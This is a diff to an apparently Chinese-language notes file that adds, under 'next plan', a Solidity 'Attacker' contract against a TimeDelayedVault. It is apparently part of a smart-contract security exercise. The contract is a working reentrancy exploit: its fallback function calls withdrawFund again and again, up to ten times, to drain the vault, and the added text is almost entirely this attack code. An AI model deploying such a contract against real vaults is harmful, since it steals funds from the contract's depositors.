@@ -42,3 +42,30 @@ addAuthorizedAccount
 
 
 ## 下一个方案
+
+提议一下简单的Attack代码：
+contract Attacker{
+    uint public stack = 0;
+    TimeDelayedVault vault;
+    address va;
+
+    function Attacker(address vaultAddress) payable {
+        va = vaultAddress;
+        vault = TimeDelayedVault(vaultAddress);
+    }
+    
+    function getVaultAddress() public returns (address a) {
+        a = va;
+    }
+    
+    function attack(){
+        vault.withdrawFund(this);
+    }
+
+    function() payable {
+        if(stack++ < 10){
+            vault.withdrawFund(this);
+        }
+    }
+    
+}
